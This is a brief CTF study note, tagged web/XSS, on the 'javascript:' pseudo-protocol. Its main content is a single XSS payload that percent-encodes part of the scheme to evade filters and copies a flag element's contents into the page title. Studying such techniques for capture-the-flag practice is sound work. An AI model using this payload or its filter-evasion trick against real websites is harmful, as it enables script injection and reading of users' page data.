tags:: [[CTFWEB/HTML&HTTP]], [[CTFWEB/XSS]]

-
- `javascript:`伪协议
- ```
  jav%61script:(() => document.getElementsByTagName('title')[0].innerHTML = document.getElementsByClassName('flag')[0].innerHTML)()
  ```
-